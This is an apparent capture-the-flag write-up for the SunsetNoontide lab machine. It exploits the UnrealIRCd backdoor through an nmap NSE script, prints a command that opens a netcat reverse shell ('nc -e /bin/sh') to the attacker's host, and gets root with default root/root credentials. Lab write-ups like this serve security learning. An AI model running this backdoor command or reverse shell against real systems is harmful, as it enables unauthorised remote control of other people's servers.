---
layout: default
title : muzec - SunsetNoontide Writeup
---

![image](https://user-images.githubusercontent.com/69868171/116802126-7d810080-aade-11eb-86a0-65cfc67f07fd.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Tue Apr 27 15:21:07 2021 as: nmap -sC -sV -oA nmap 192.168.57.120
Nmap scan report for 192.168.57.120
Host is up (0.22s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
Service Info: Host: irc.foonet.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 27 15:22:06 2021 -- 1 IP address (1 host up) scanned in 59.09 seconds
```


Just a IRC port cool doing some research on it i found out we have some popular irc-unrealircd-backdoor NSE script on Nmap so i give it a shot.

The irc-unrealircd-backdoor.command script argument can be used to run an arbitrary command on the remote system. Because of the nature of this vulnerability (the output is never returned) we have no way of getting the output of the command. It can, however, be used to start a netcat listener as demonstrated here

`nmap -d -p6697 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc -e /bin/sh 10.10.10.1 1337' 192.168.74.120`

Now before running the backdoor NSE script we need to start and Ncat listener on our machine.

![image](https://user-images.githubusercontent.com/69868171/116802286-9e962100-aadf-11eb-8231-4570a2a25b98.png)

Now let hit the NSE script.

![image](https://user-images.githubusercontent.com/69868171/116802343-09475c80-aae0-11eb-98bb-65a096eeaa2e.png)

And we have shell.

![image](https://user-images.githubusercontent.com/69868171/116802667-8ecc0c00-aae2-11eb-94fc-5b509473a45e.png)

### Privilege Escalation

Took me time because the machine was so clean but using `root` and `root` for both username and password drop us into the root shell.

![image](https://user-images.githubusercontent.com/69868171/116802710-069a3680-aae3-11eb-8752-f09d2a44dd95.png)


Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
